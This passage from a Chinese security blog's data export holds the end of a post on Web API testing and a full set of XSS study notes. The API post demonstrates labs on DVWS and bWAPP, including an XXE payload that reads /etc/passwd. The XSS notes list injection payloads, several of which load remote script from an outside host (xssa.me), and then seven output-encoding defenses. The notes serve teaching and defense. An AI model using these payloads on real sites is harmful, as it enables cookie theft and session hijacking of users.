class=\"line\">\t\t&lt;/contact&gt;</div><div class=\"line\">\t&lt;/person&gt;</div></pre></td></tr></table></figure></p>\n<p>JSON示例:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">  &quot;person&quot;: &#123;</div><div class=\"line\">    &quot;name&quot;: &quot;Jason&quot;,</div><div class=\"line\">    &quot;age&quot;: &quot;99&quot;,</div><div class=\"line\">    &quot;sex&quot;: &quot;male&quot;,</div><div class=\"line\">    &quot;contact&quot;: &#123;</div><div class=\"line\">      &quot;mobile&quot;: &quot;13888888888&quot;,</div><div class=\"line\">      &quot;email&quot;: &quot;bingo@tass.com.cn&quot;,</div><div class=\"line\">      &quot;wechat&quot;: &quot;bingo&quot;</div><div class=\"line\">    &#125;</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"API安全\"><a href=\"#API安全\" class=\"headerlink\" title=\"API安全\"></a>API安全</h1><h2 id=\"API的安全要素\"><a href=\"#API的安全要素\" class=\"headerlink\" title=\"API的安全要素\"></a>API的安全要素</h2><ul>\n<li><p>认证和鉴权 - 认证用户身份 &amp; 确定用户权限</p>\n<p>  通常情况下，webAPI是基于HTTP协议的，也是无状态传输的。故而认证任务就需要我们自己实现，所以原则上每一次API请求都需要带上身份认证信息，通常使用的是API key。</p>\n</li>\n<li><p>加密和签名 - 保证信息的保密性和完整性</p>\n<p>  通常使用SSL/TLS来加密通信消息，由API客户端发送和接收。签名用于确保API请求和响应在传输过程中未被篡改。</p>\n</li>\n<li><p>漏洞 - 注入攻击 &amp; 敏感数据泄露 &amp; 越权访问</p>\n</li>\n</ul>\n<h2 id=\"攻击面检测\"><a href=\"#攻击面检测\" class=\"headerlink\" title=\"攻击面检测\"></a>攻击面检测</h2><ul>\n<li>尽可能多的了解API端点、消息、参数、行为。</li>\n<li>发现API中可能存在问题的元数据。</li>\n<li>记录流量进一步学习API</li>\n<li>爆破 - 暴力破解路径或资源</li>\n</ul>\n<h2 id=\"攻击方式\"><a href=\"#攻击方式\" class=\"headerlink\" title=\"攻击方式\"></a>攻击方式</h2><p>1.模糊测试</p>\n<pre><code>使用自动化工具并行的将大量的随机内容（各种可能的值或可能的攻击向量）作为输入参数进行长时间的尝试，并自动验证响应信息，确认是否获取到意外收获（系统或代码相关的信息）。\n</code></pre><p>2.注入攻击</p>\n<pre><code>使用SQL,XML,Xpath,JSON,JavaScript等的常见攻击向量尝试进行代码注入，并验证意外响应。\n</code></pre><p>3.无效/越界内容</p>\n<pre><code>尝试各种无效或者超范围的内容，并验证响应信息。\n</code></pre><p>4.恶意内容</p>\n<pre><code>在上传功能点尝试上传可执行文件或脚本等，使服务器尝试进行解析。\n</code></pre><p>5.XSS</p>\n<pre><code>上传常见攻击向量进行XSS（反射型，存储型等）测试。\n</code></pre><p>6.CSRF</p>\n<pre><code>测试API是否含有token，token是否能复用，是否可被伪造。\n</code></pre><p>7.不安全的直接对象引用</p>\n<pre><code>尝试对顺序化的id号进行越权访问，尝试访问无权限的方法或操作。\n</code></pre><p>8.其它考虑</p>\n<pre><code>会话认证（token是否正确使用）\n安全配置（前述攻击照成系统/应用等信息泄露）\n</code></pre><h1 id=\"攻击演示\"><a href=\"#攻击演示\" class=\"headerlink\" title=\"攻击演示\"></a>攻击演示</h1><h2 id=\"1-DVWS-WSDL-Enumeration\"><a href=\"#1-DVWS-WSDL-Enumeration\" class=\"headerlink\" title=\"1. DVWS | WSDL Enumeration\"></a>1. DVWS | WSDL Enumeration</h2><p>前端页面<br><img src=\"/2017/07/Web-API接口安全了解/screenshot01.png\" alt=\"\"></p>\n<p>源码中暴露wsdl文件<br><img src=\"/2017/07/Web-API接口安全了解/screenshot02.png\" alt=\"\"></p>\n<p>wsdl文件中可以查看到四种方法<br><img src=\"/2017/07/Web-API接口安全了解/screenshot03.png\" alt=\"\"></p>\n<p>使用READY!API（SOAPUI升级版）可以直观的看到4种方法并进行接口测试</p>\n<p>尝试使用check_user_information方法，尝试填入username（实际测试中可能需要结合爆破方式），接口返回了相关数据，从而导致数据泄露。<br><img src=\"/2017/07/Web-API接口安全了解/screenshot04.png\" alt=\"\"></p>\n<h2 id=\"2-DVWS-XML-External-Entity-Processing\"><a href=\"#2-DVWS-XML-External-Entity-Processing\" class=\"headerlink\" title=\"2. DVWS | XML External Entity Processing\"></a>2. DVWS | XML External Entity Processing</h2><p>提交正常请求:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;name&gt;Mr.Bingo&lt;/name&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot21.png\" alt=\"\"><br>提交payload:<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt; &lt;!DOCTYPE bingo [  &lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot24.png\" alt=\"\"></p>\n<p>额外测试：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot22.png\" alt=\"\"><br><img src=\"/2017/07/Web-API接口安全了解/screenshot23.png\" alt=\"\"></p>\n<h2 id=\"3-DVWS-Server-Side-Request-Forgery\"><a href=\"#3-DVWS-Server-Side-Request-Forgery\" class=\"headerlink\" title=\"3. DVWS | Server Side Request Forgery\"></a>3. DVWS | Server Side Request Forgery</h2><p>正常数据请求</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot31.png\" alt=\"\"><br>篡改请求URL</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot32.png\" alt=\"\"></p>\n<h2 id=\"4-DVWS-REST-API-SQL-Injection\"><a href=\"#4-DVWS-REST-API-SQL-Injection\" class=\"headerlink\" title=\"4. DVWS | REST API SQL Injection\"></a>4. DVWS | REST API SQL Injection</h2><p>正常请求资源：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot41.png\" alt=\"\"></p>\n<p>SQL注入：</p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot42.png\" alt=\"\"></p>\n<h2 id=\"5-bWAPP-SQL-Injection-Blind-WS-SOAP\"><a href=\"#5-bWAPP-SQL-Injection-Blind-WS-SOAP\" class=\"headerlink\" title=\"5. bWAPP | SQL Injection - Blind (WS/SOAP)\"></a>5. bWAPP | SQL Injection - Blind (WS/SOAP)</h2><p>由于在前端屏蔽了后端所采用的API接口功能，故而贴出部分源码以供参考<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;?php</div><div class=\"line\">if(isset($_REQUEST[&quot;title&quot;]))</div><div class=\"line\">&#123;   </div><div class=\"line\">    // Includes the NuSOAP library</div><div class=\"line\">    require_once(&quot;soap/nusoap.php&quot;);</div><div class=\"line\"></div><div class=\"line\">    // Creates an instance of the soap_client class</div><div class=\"line\">    $client = new nusoap_client(&quot;http://localhost/bWAPP/ws_soap.php&quot;);</div><div class=\"line\"></div><div class=\"line\">    // Calls the SOAP function</div><div class=\"line\">    $tickets_stock = $client-&gt;call(&quot;get_tickets_stock&quot;, array(&quot;title&quot; =&gt; sqli($_REQUEST[&quot;title&quot;])));</div><div class=\"line\"></div><div class=\"line\">    echo &quot;We have &lt;b&gt;&quot; . $tickets_stock . &quot;&lt;/b&gt; movie tickets available in our stock.&quot;;</div><div class=\"line\">&#125;</div><div class=\"line\">?&gt;</div></pre></td></tr></table></figure></p>\n<p><img src=\"/2017/07/Web-API接口安全了解/screenshot50.png\" alt=\"\"></p>\n<blockquote>\n<p>  当前个人对API接口测试的理解尚比较粗浅。涉及到fuzz、加解密及其他复杂的场景尚且无法拿出好的案例及测试平台。后续有机会再行补充，另外，希望有货的大佬们能多多分享。</p>\n</blockquote>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><h2 id=\"测试工具\"><a href=\"#测试工具\" class=\"headerlink\" title=\"测试工具\"></a>测试工具</h2><ul>\n<li>Ready!API ( SoapUI )</li>\n<li>Burpsuite</li>\n<li><p>FuzzAPI</p>\n<h2 id=\"测试平台\"><a href=\"#测试平台\" class=\"headerlink\" title=\"测试平台\"></a>测试平台</h2></li>\n<li><p>DVWS  <a href=\"https://github.com/snoopythesecuritydog/dvws\">https://github.com/snoopythesecuritydog/dvws</a></p>\n</li>\n<li><p>bWAPP <a href=\"https://sourceforge.net/projects/bwapp/\">https://sourceforge.net/projects/bwapp/</a></p>\n</li>\n<li><p>Hackazon  <a href=\"https://github.com/rapid7/hackazon\">https://github.com/rapid7/hackazon</a></p>\n<p>  Web Version <a href=\"http://hackazon.webscantest.com\">http://hackazon.webscantest.com</a></p>\n</li>\n<li><p>Mutillidae    <a href=\"https://sourceforge.net/projects/mutillidae/\">https://sourceforge.net/projects/mutillidae/</a></p>\n</li>\n<li><p>Juice-shop    <a href=\"https://github.com/bkimminich/juice-shop\">https://github.com/bkimminich/juice-shop</a></p>\n</li>\n</ul>\n<h2 id=\"参考资料-1\"><a href=\"#参考资料-1\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><p>OWASP Top 10 - 2017 RC1</p>\n</li>\n<li><p>REST API 安全设计指南 <a href=\"http://www.freebuf.com/articles/web/82108.html\">http://www.freebuf.com/articles/web/82108.html</a></p>\n</li>\n<li><p>REST Security Cheat Sheet <a href=\"https://www.owasp.org/index.php/REST_Security_Cheat_Sheet\">https://www.owasp.org/index.php/REST_Security_Cheat_Sheet</a></p>\n</li>\n</ul>"},{"title":"XSS - 笔记整理","date":"2017-08-31T10:21:02.000Z","_content":"\n>   XSS(Cross Site Scripting)\n\n>   用户输入超出开发者预期的数据，导致在网页中添加或修改页面代码，从而执行恶意操作。\n\n### XSS的分类\n- 反射型XSS\n- 持久型XSS\n- DOM-based型XSS（客户端注入）\n<!-- more -->\n\n### XSS的危害\n- Cookie资料窃取\n- 劫持用户会话\n- 广告弹窗\n- 网页挂马\n- 网站钓鱼\n- 按键记录\n- ...(JS能完成的任何功能)\n\n### XSS的构造\n- ##### 利用<>标记注入HTML/JavaScript标签\n```\n    <script>alert(1)</script>\n\n    <sCRiPt sRC=http://xssa.me/EXgq></sCrIpT>\n```\n\n- ##### 利用HTML标签属性值执行XSS\n```\n    <a href=\"javascript:alert(1)\">click me</a>\n\n    ...除href/src外的其它类似属性\n```\n\n- ##### 在HTML标签中注入事件\n```\n    <img src=x onerror=\"javascript:alert(/XSS/)\">\n\n    <img src=logo.png onload=s=createElement('script');body.appendChild(s);s.src='http://xssa.me/EXgq';>\n\n    <input onfocus=a='scr';s=createElement(a+'ipt');body.appendChild(s);s.src='http://xssa.me/EXgq'; autofocus>\n    \n    ...各种on事件\n```\n\n- ##### 利用CSS跨站\n>   尝试多种样式表(css),均无效。原因未知\n\n### XSS的变形\n```\n    <sCRiPt/SrC=//xssa.me/EXgq>\n\n    <ScRiPt/**/src=http://xssa.me/EXgq></ScRiPt>\n\n    <img src=1 onerror=$.get('http://xssa.me/EXgq')>      (jquery)\n\n    eval($.get('http://xssa.me/EXgq'))            (jquery)\n\n    <svg/onload=document.body.appendChild(document.createElement(/script/.source)).src='http://xssa.me/EXgq'\n```\n\n### XSS的防御\n\n原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码\n\n原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码\n\n**HTML Entity编码**\n```\n&     –>     &amp;\n<     –>     &lt;\n>     –>     &gt;\n”     –>     &quot;\n‘     –>     &#x27;\n/     –>     &#x2f;\n```\n原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码\n>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &#xHH; （以&#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符）\n\n>   之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。\n\n>   除了空格符可以闭合当前属性外，这些符号也可以：\n%     *     +     ,     –     /     ;     <     =     >     ^     |     `(反单引号，IE会认为它是单引号)\n\n\n原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码\n>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \\xHH （以 \\x 开头，HH则是指该字符对应的十六进制数字\n\n>   在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \\ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \\” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。\n\n原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码\n>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \\HH （以 \\ 开头，HH则是指该字符对应的十六进制数字）\n\n原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码\n>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）\n>   在对URL进行编码的时候，有两点是需要特别注意的：\n>   1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码\n>   2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。\n\n原则7：使用富文本时，使用XSS规则引擎进行编码过滤\n>   针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如 b, i, p等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在div, p等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到SCRIPT标签里。\n\n### XSS Cheat Sheet\n[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)\n\n### 参考资料\n- 《XSS跨站脚本 攻击剖析与防御》[PDF 百度云](https://pan.baidu.com/s/1cwDUhg) (PS:书写的很一般，没必要买实体书，虽说我买了。)\n- [防御XSS的七条原则](http://www.freebuf.com/articles/web/9977.html)\n- [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)","source":"_posts/XSS-笔记整理.md","raw":"---\ntitle: XSS - 笔记整理\ndate: 2017-08-31 18:21:02\ntags: Web\n---\n\n>   XSS(Cross Site Scripting)\n\n>   用户输入超出开发者预期的数据，导致在网页中添加或修改页面代码，从而执行恶意操作。\n\n### XSS的分类\n- 反射型XSS\n- 持久型XSS\n- DOM-based型XSS（客户端注入）\n<!-- more -->\n\n### XSS的危害\n- Cookie资料窃取\n- 劫持用户会话\n- 广告弹窗\n- 网页挂马\n- 网站钓鱼\n- 按键记录\n- ...(JS能完成的任何功能)\n\n### XSS的构造\n- ##### 利用<>标记注入HTML/JavaScript标签\n```\n    <script>alert(1)</script>\n\n    <sCRiPt sRC=http://xssa.me/EXgq></sCrIpT>\n```\n\n- ##### 利用HTML标签属性值执行XSS\n```\n    <a href=\"javascript:alert(1)\">click me</a>\n\n    ...除href/src外的其它类似属性\n```\n\n- ##### 在HTML标签中注入事件\n```\n    <img src=x onerror=\"javascript:alert(/XSS/)\">\n\n    <img src=logo.png onload=s=createElement('script');body.appendChild(s);s.src='http://xssa.me/EXgq';>\n\n    <input onfocus=a='scr';s=createElement(a+'ipt');body.appendChild(s);s.src='http://xssa.me/EXgq'; autofocus>\n    \n    ...各种on事件\n```\n\n- ##### 利用CSS跨站\n>   尝试多种样式表(css),均无效。原因未知\n\n### XSS的变形\n```\n    <sCRiPt/SrC=//xssa.me/EXgq>\n\n    <ScRiPt/**/src=http://xssa.me/EXgq></ScRiPt>\n\n    <img src=1 onerror=$.get('http://xssa.me/EXgq')>      (jquery)\n\n    eval($.get('http://xssa.me/EXgq'))            (jquery)\n\n    <svg/onload=document.body.appendChild(document.createElement(/script/.source)).src='http://xssa.me/EXgq'\n```\n\n### XSS的防御\n\n原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码\n\n原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码\n\n**HTML Entity编码**\n```\n&     –>     &amp;\n<     –>     &lt;\n>     –>     &gt;\n”     –>     &quot;\n‘     –>     &#x27;\n/     –>     &#x2f;\n```\n原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码\n>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &#xHH; （以&#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符）\n\n>   之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。\n\n>   除了空格符可以闭合当前属性外，这些符号也可以：\n%     *     +     ,     –     /     ;     <     =     >     ^     |     `(反单引号，IE会认为它是单引号)\n\n\n原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码\n>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \\xHH （以 \\x 开头，HH则是指该字符对应的十六进制数字\n\n>   在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \\ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \\” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。\n\n原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码\n>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \\HH （以 \\ 开头，HH则是指该字符对应的十六进制数字）\n\n原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码\n>   除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）\n>   在对URL进行编码的时候，有两点是需要特别注意的：\n>   1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码\n>   2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。\n\n原则7：使用富文本时，使用XSS规则引擎进行编码过滤\n>   针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如 b, i, p等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在div, p等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到SCRIPT标签里。\n\n### XSS Cheat Sheet\n[https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)\n\n### 参考资料\n- 《XSS跨站脚本 攻击剖析与防御》[PDF 百度云](https://pan.baidu.com/s/1cwDUhg) (PS:书写的很一般，没必要买实体书，虽说我买了。)\n- [防御XSS的七条原则](http://www.freebuf.com/articles/web/9977.html)\n- [XSS Filter Evasion Cheat Sheet](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)","slug":"XSS-笔记整理","published":1,"updated":"2017-08-31T10:37:57.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfsn000m97uvn2xelywb","content":"<blockquote>\n<p>  XSS(Cross Site Scripting)</p>\n<p>  用户输入超出开发者预期的数据，导致在网页中添加或修改页面代码，从而执行恶意操作。</p>\n</blockquote>\n<h3 id=\"XSS的分类\"><a href=\"#XSS的分类\" class=\"headerlink\" title=\"XSS的分类\"></a>XSS的分类</h3><ul>\n<li>反射型XSS</li>\n<li>持久型XSS</li>\n<li>DOM-based型XSS（客户端注入）<a id=\"more\"></a>\n</li>\n</ul>\n<h3 id=\"XSS的危害\"><a href=\"#XSS的危害\" class=\"headerlink\" title=\"XSS的危害\"></a>XSS的危害</h3><ul>\n<li>Cookie资料窃取</li>\n<li>劫持用户会话</li>\n<li>广告弹窗</li>\n<li>网页挂马</li>\n<li>网站钓鱼</li>\n<li>按键记录</li>\n<li>…(JS能完成的任何功能)</li>\n</ul>\n<h3 id=\"XSS的构造\"><a href=\"#XSS的构造\" class=\"headerlink\" title=\"XSS的构造\"></a>XSS的构造</h3><ul>\n<li><h5 id=\"利用-lt-gt-标记注入HTML-JavaScript标签\"><a href=\"#利用-lt-gt-标记注入HTML-JavaScript标签\" class=\"headerlink\" title=\"利用&lt;&gt;标记注入HTML/JavaScript标签\"></a>利用&lt;&gt;标记注入HTML/JavaScript标签</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script&gt;alert(1)&lt;/script&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;sCRiPt sRC=http://xssa.me/EXgq&gt;&lt;/sCrIpT&gt;</div></pre></td></tr></table></figure>\n</li>\n<li><h5 id=\"利用HTML标签属性值执行XSS\"><a href=\"#利用HTML标签属性值执行XSS\" class=\"headerlink\" title=\"利用HTML标签属性值执行XSS\"></a>利用HTML标签属性值执行XSS</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;a href=&quot;javascript:alert(1)&quot;&gt;click me&lt;/a&gt;</div><div class=\"line\"></div><div class=\"line\">...除href/src外的其它类似属性</div></pre></td></tr></table></figure>\n</li>\n<li><h5 id=\"在HTML标签中注入事件\"><a href=\"#在HTML标签中注入事件\" class=\"headerlink\" title=\"在HTML标签中注入事件\"></a>在HTML标签中注入事件</h5><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;img src=x onerror=&quot;javascript:alert(/XSS/)&quot;&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;img src=logo.png onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://xssa.me/EXgq&apos;;&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;input onfocus=a=&apos;scr&apos;;s=createElement(a+&apos;ipt&apos;);body.appendChild(s);s.src=&apos;http://xssa.me/EXgq&apos;; autofocus&gt;</div><div class=\"line\"></div><div class=\"line\">...各种on事件</div></pre></td></tr></table></figure>\n</li>\n<li><h5 id=\"利用CSS跨站\"><a href=\"#利用CSS跨站\" class=\"headerlink\" title=\"利用CSS跨站\"></a>利用CSS跨站</h5><blockquote>\n<p>  尝试多种样式表(css),均无效。原因未知</p>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"XSS的变形\"><a href=\"#XSS的变形\" class=\"headerlink\" title=\"XSS的变形\"></a>XSS的变形</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;sCRiPt/SrC=//xssa.me/EXgq&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;ScRiPt/**/src=http://xssa.me/EXgq&gt;&lt;/ScRiPt&gt;</div><div class=\"line\"></div><div class=\"line\">&lt;img src=1 onerror=$.get(&apos;http://xssa.me/EXgq&apos;)&gt;      (jquery)</div><div class=\"line\"></div><div class=\"line\">eval($.get(&apos;http://xssa.me/EXgq&apos;))            (jquery)</div><div class=\"line\"></div><div class=\"line\">&lt;svg/onload=document.body.appendChild(document.createElement(/script/.source)).src=&apos;http://xssa.me/EXgq&apos;</div></pre></td></tr></table></figure>\n<h3 id=\"XSS的防御\"><a href=\"#XSS的防御\" class=\"headerlink\" title=\"XSS的防御\"></a>XSS的防御</h3><p>原则1：不要在页面中插入任何不可信数据，除非这些数已经据根据下面几个原则进行了编码</p>\n<p>原则2：在将不可信数据插入到HTML标签之间时，对这些数据进行HTML Entity编码</p>\n<p><strong>HTML Entity编码</strong><br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\">&amp;     –&gt;     &amp;amp;</div><div class=\"line\">&lt;     –&gt;     &amp;lt;</div><div class=\"line\">&gt;     –&gt;     &amp;gt;</div><div class=\"line\">”     –&gt;     &amp;quot;</div><div class=\"line\">‘     –&gt;     &amp;#x27;</div><div class=\"line\">/     –&gt;     &amp;#x2f;</div></pre></td></tr></table></figure></p>\n<p>原则3：在将不可信数据插入到HTML属性里时，对这些数据进行HTML属性编码</p>\n<blockquote>\n<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 &#xHH; （以&amp;#x开头，HH则是指该字符对应的十六进制数字，分号作为结束符）</p>\n<p>  之所以编码规则如此严格，是因为开发者有时会忘记给属性的值部分加上引号。如果属性值部分没有使用引号的话，攻击者很容易就能闭合掉当前属性，随后即可插入攻击脚本。例如，如果属性没有使用引号，又没有对数据进行严格编码，那么一个空格符就可以闭合掉当前属性。</p>\n<p>  除了空格符可以闭合当前属性外，这些符号也可以：<br>%     *     +     ,     –     /     ;     &lt;     =     &gt;     ^     |     `(反单引号，IE会认为它是单引号)</p>\n</blockquote>\n<p>原则4：在将不可信数据插入到SCRIPT里时，对这些数据进行SCRIPT编码</p>\n<blockquote>\n<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \\xHH （以 \\x 开头，HH则是指该字符对应的十六进制数字</p>\n<p>  在对不可信数据做编码的时候，千万不能图方便使用反斜杠（ \\ ）对特殊字符进行简单转义，比如将双引号 ” 转义成 \\” ，这样做是不可靠的，因为浏览器在对页面做解析的时候，会先进行HTML解析，然后才是JavaScript解析，所以双引号很可能会被当做HTML字符进行HTML解析，这时双引号就可以突破代码的值部分，使得攻击者可以继续进行XSS攻击。</p>\n</blockquote>\n<p>原则5：在将不可信数据插入到Style属性里时，对这些数据进行CSS编码</p>\n<blockquote>\n<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 \\HH （以 \\ 开头，HH则是指该字符对应的十六进制数字）</p>\n</blockquote>\n<p>原则6：在将不可信数据插入到HTML URL里时，对这些数据进行URL编码</p>\n<blockquote>\n<p>  除了阿拉伯数字和字母，对其他所有的字符进行编码，只要该字符的ASCII码小于256。编码后输出的格式为 %HH （以 % 开头，HH则是指该字符对应的十六进制数字）<br>  在对URL进行编码的时候，有两点是需要特别注意的：<br>  1) URL属性应该使用引号将值部分包围起来，否则攻击者可以很容易突破当前属性区域，插入后续攻击代码<br>  2) 不要对整个URL进行编码，因为不可信数据可能会被插入到href, src或者其他以URL为基础的属性里，这时需要对数据的起始部分的协议字段进行验证，否则攻击者可以改变URL的协议，例如从HTTP协议改为DATA伪协议，或者javascript伪协议。</p>\n</blockquote>\n<p>原则7：使用富文本时，使用XSS规则引擎进行编码过滤</p>\n<blockquote>\n<p>  针对富文本的特殊性，我们可以使用XSS规则引擎对用户输入进行编码过滤，只允许用户输入安全的HTML标签，如 b, i, p等，对其他数据进行HTML编码。需要注意的是，经过规则引擎编码过滤后的内容只能放在div, p等安全的HTML标签里，不要放到HTML标签的属性值里，更不要放到HTML事件处理属性里，或者放到SCRIPT标签里。</p>\n</blockquote>\n<h3 id=\"XSS-Cheat-Sheet\"><a 